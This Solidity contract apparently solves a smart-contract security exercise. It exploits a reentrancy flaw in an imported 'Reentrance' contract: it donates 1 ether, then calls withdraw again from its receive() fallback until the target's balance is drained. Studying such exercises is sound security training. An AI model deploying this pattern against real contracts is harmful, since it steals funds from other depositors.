// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/10/ReEntrancy.sol";

contract ReEntrancyAttack {
    Reentrance reEntranceAddress;

    constructor(Reentrance inputUserAddress) public {
        reEntranceAddress = inputUserAddress;
    }


    function attack() payable public {
        reEntranceAddress.donate{value: 1 ether}(address(this));
        reEntranceAddress.withdraw(1*10**18);
    }

    receive() payable external {
        if (address(reEntranceAddress).balance >= 1*10**18) {
            reEntranceAddress.withdraw(1*10**18);
        }
    }
    

}
